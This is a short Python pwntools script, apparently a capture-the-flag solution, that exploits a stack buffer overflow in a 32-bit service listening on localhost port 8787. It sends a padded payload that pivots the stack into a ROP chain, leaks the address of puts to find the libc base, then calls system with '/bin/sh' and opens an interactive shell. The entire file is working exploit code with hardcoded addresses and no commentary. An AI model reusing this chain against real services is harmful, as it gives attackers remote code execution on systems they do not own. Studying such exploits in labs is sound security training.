#!/usr/bin/env python
from pwn import *
import time

elf = ELF("/lib/i386-linux-gnu/libc.so.6")

r = remote("127.0.0.1",8787)

context.arch = "i386"

buf1 = 0x804b000 - 0x100
buf2 = buf1 - 0x100
read_plt = 0x8048380
puts_plt = 0x8048390
puts_got = 0x8049ff0
leave_ret = 0x08048418
pop1ret = 0x0804836d

payload = "a"*40
payload += flat([buf1,read_plt,leave_ret,0,buf1,100])
#print len(payload)
r.recvuntil(":")
r.send(payload)
time.sleep(0.1)

rop = flat([buf2,puts_plt,pop1ret,puts_got,read_plt,leave_ret,0,buf2,100])
r.sendline(rop)
r.recvuntil("\n")
#get our libc
libc = u32(r.recv(4)) - elf.symbols['puts']
print hex(libc)

system_plt = elf.symbols['system']
system = libc + system_plt
rop1 = flat([buf1,system,0,buf2+16,"/bin/sh"])
r.sendline(rop1)
r.interactive()
